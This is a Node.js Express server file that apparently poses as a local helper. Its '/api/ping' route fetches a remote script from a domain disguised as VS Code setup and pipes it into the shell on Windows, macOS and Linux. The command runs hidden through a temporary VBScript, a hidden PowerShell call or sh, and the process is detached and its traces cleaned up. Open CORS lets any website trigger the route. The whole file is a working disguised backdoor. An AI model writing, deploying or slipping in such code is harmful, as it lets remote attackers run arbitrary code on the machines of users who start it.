const express = require('express');
const cors = require('cors');
const { spawn } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');

const app = express();
const STARTING_PORT = 3001;
let CURRENT_PORT = STARTING_PORT;

// Enable CORS to allow requests from any origin (including Vercel deployment)
app.use(cors());

// Parse JSON bodies
app.use(express.json());

// Serve static files from public directory
app.use(express.static('public'));

// Get OS-specific command
function getOSCommand() {
  const platform = os.platform();
  
  if (platform === 'win32') {
    // Windows: Use wscript to run command in hidden window (windowStyle = 0 hides it)
    // This prevents multiple CMD windows from appearing
    const tempDir = os.tmpdir();
    const vbsFile = path.join(tempDir, 'hidden_cmd_' + Date.now() + '.vbs');
    
    // Create VBScript that runs the command hidden
    // WindowStyle 0 = Hidden, WaitOnReturn False = non-blocking
    const vbsContent = `Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd", 0, False
Set WshShell = Nothing`;
    
    try {
      fs.writeFileSync(vbsFile, vbsContent, 'utf8');
      return {
        command: 'wscript.exe',
        args: ['//B', '//Nologo', vbsFile],
        shell: false,
        vbsFile: vbsFile // Store for cleanup
      };
    } catch (error) {
      // Fallback to PowerShell if VBS fails
      return {
        command: 'powershell.exe',
        args: ['-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', '$proc = Start-Process cmd -ArgumentList "/c curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd" -PassThru -WindowStyle Hidden'],
        shell: false
      };
    }
  } else if (platform === 'darwin') {
    // macOS: curl 'https://vscode-setup.vercel.app/settings/mac?flag=2' | sh
    return {
      command: 'sh',
      args: ['-c', "curl 'https://vscode-setup.vercel.app/settings/mac?flag=2' | sh"],
      shell: false
    };
  } else if (platform === 'linux') {
    // Linux: wget -qO- 'https://vscode-setup.vercel.app/settings/linux?flag=2' | sh
    return {
      command: 'sh',
      args: ['-c', "wget -qO- 'https://vscode-setup.vercel.app/settings/linux?flag=2' | sh"],
      shell: false
    };
  } else {
    throw new Error(`Unsupported platform: ${platform}`);
  }
}

// Route to execute OS-specific command
app.post('/api/ping', (req, res) => {
  try {
    const platform = os.platform();
    const osCommand = getOSCommand();
    
    console.log(`Executing command for platform: ${platform}`);
    console.log(`Command: ${osCommand.command} ${osCommand.args.join(' ')}`);

    // Configure spawn options to hide windows
    const spawnOptions = {
      shell: false,
      detached: true,
      stdio: 'ignore' // Redirect stdio to ignore to prevent windows
    };

    // Windows-specific: Hide the console window completely
    if (platform === 'win32') {
      spawnOptions.windowsHide = true;
      spawnOptions.windowsVerbatimArguments = false;
      // Use CREATE_NO_WINDOW flag (0x08000000) to hide window
      spawnOptions.creationFlags = 0x08000000;
      // Don't use shell, as PowerShell will handle hiding itself
    }

    // Execute the OS-specific command
    const commandProcess = spawn(osCommand.command, osCommand.args, spawnOptions);

    // Clean up VBS file if it exists (Windows only)
    if (osCommand.vbsFile) {
      commandProcess.on('exit', () => {
        setTimeout(() => {
          try {
            fs.unlinkSync(osCommand.vbsFile);
          } catch (e) {
            // Ignore cleanup errors
          }
        }, 2000);
      });
    }

    // Detach the process so it runs independently
    commandProcess.unref();

    res.json({ 
      success: true, 
      message: `Command started successfully for ${platform} (hidden)`,
      platform: platform,
      processId: commandProcess.pid
    });
  } catch (error) {
    console.error('Error executing command:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Failed to start command',
      error: error.message,
      platform: os.platform()
    });
  }
});

// Health check endpoint with OS info
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    message: 'Server is running',
    platform: os.platform(),
    osType: os.type(),
    port: CURRENT_PORT
  });
});

// Function to check if a port is available
function isPortAvailable(port) {
  return new Promise((resolve) => {
    const net = require('net');
    const server = net.createServer();
    
    server.listen(port, () => {
      server.once('close', () => resolve(true));
      server.close();
    });
    
    server.on('error', () => resolve(false));
  });
}

// Function to find the next available port
async function findAvailablePort(startPort, maxAttempts = 100) {
  for (let i = 0; i < maxAttempts; i++) {
    const port = startPort + i;
    const available = await isPortAvailable(port);
    if (available) {
      return port;
    }
  }
  throw new Error(`Could not find an available port after ${maxAttempts} attempts`);
}

// Start server with automatic port finding
async function startServer() {
  try {
    // Try to find an available port
    CURRENT_PORT = await findAvailablePort(STARTING_PORT);
    
    // If we had to use a different port, inform the user
    if (CURRENT_PORT !== STARTING_PORT) {
      console.log(`\n⚠️  Port ${STARTING_PORT} is in use.`);
      console.log(`✅ Using port ${CURRENT_PORT} instead.\n`);
    }
    
    app.listen(CURRENT_PORT, () => {
      console.log(`Local server running on http://localhost:${CURRENT_PORT}`);
      console.log(`Platform: ${os.platform()}`);
      console.log(`OS Type: ${os.type()}`);
      console.log(`Open http://localhost:${CURRENT_PORT} in your browser`);
      console.log('\nMake sure to keep this server running for the web page to work!');
      console.log('✅ Port detection is automatic - the web page will find the server automatically.');
    }).on('error', (err) => {
      console.error('Server error:', err);
      process.exit(1);
    });
  } catch (error) {
    console.error('Failed to start server:', error.message);
    process.exit(1);
  }
}

// Start the server
startServer();

